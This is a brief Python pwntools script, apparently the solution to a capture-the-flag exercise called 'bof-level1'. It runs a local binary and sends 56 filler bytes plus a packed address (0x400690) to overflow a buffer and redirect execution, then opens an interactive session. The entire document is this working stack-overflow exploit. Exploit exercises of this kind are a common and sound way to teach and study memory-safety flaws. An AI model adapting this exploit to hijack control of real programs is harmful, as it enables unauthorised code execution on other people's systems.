#!/usr/bin/env python

from pwn import *

p = process("./bof-level1")

print(p.recv())

p.sendline("A"*56 + p64(0x400690))

p.interactive()
